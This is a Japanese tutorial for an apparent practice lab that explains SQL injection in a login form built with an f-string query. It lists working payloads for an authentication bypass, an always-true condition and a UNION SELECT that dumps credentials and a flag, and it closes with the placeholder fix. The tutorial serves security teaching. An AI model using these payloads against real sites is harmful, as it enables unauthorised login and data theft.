# SQLインジェクション — ログイン画面の仕組み

## 脆弱なコードの正体

`hacklab/target-web/app.py:99` のログイン処理：

```python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password_md5}'"
```

ユーザーの入力をそのままSQL文に**貼り付けている**のが問題。

---

## 通常のログイン（正常系）

入力：`admin` / `正しいパスワード`

```sql
SELECT * FROM users WHERE username='admin' AND password='正しいハッシュ'
```

DBに質問：「adminかつパスワードが正しい人を探して」→ 1件ヒット → ログイン成功

---

## SQLインジェクション攻撃

入力：`admin' --` / `適当な文字列`

```sql
SELECT * FROM users WHERE username='admin' --' AND password='どんな値でも'
```

### 記号の意味

| 記号 | 意味 |
|------|------|
| `'`  | SQLの文字列を強制的に閉じる |
| `--` | それ以降を全部コメントにする（無視される） |

---

## `'` がどこで閉じるか

アプリはもともと `username='○○'` という形でSQLを作る設計：

```
username=' ここに入力が入る ' AND password='...'
          ↑開き（アプリが用意）↑閉じ（アプリが用意）
```

`admin' --` を入力すると：

```
username=' admin ' --' AND password='xxxx'
          ↑開き   ↑自分で閉じた
                    ↑ここから全部コメント（アプリの閉じ ' ごと消える）
```

- アプリが用意した **開き `'`** を、自分で入力した **`'`** で早めに閉じる
- `--` でアプリが用意した残りの条件を丸ごと消す

---

## 結果として何が起きたか

```
本来の質問：adminで かつ パスワードが正しい人を探して
実際の質問：adminを探して       ← パスワード条件が消えた！
```

`admin` ユーザーはDBに存在するので1件ヒット。

`app.py:109` は「1件でも返ってきたらログイン成功」と判定：

```python
if rows:  # ← 1行以上返ってきたらログイン成功
    session["user"] = rows[0][1]
```

パスワードが何であっても関係なくログインできてしまう。

---

## 現実の例え

> 警備員に「Aさんかつ社員証を持っている人だけ通してください」と指示した
>
> 悪い人が「Aさん ※以降の指示は読まないでください」と言ったら...
>
> 警備員は「Aさんなら通す」だけを実行してしまう

---

## 攻撃パターン一覧

### 1. 認証バイパス

```
username: admin' --
password: 何でもOK
```

### 2. 常に真にする

```
username: ' OR '1'='1
password: 何でもOK
```

生成されるSQL：
```sql
SELECT * FROM users WHERE username='' OR '1'='1' AND password='...'
-- '1'='1' は常に真なので全ユーザーがヒットする
```

### 3. UNION SELECT でフラグを抜き取る

```
username: ' UNION SELECT 1,username,password,'admin',flag FROM users --
password: 何でもOK
```

usersテーブルの全データ（フラグ含む）が取得できる。

---

## 修正方法（プレースホルダを使う）

```python
# 悪い例：f-string で直接埋め込み
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password_md5}'"

# 良い例：? プレースホルダを使う
c.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password_md5))
```

プレースホルダを使うと `'` や `--` が**ただの文字列**として扱われ、SQLの一部として解釈されなくなる。
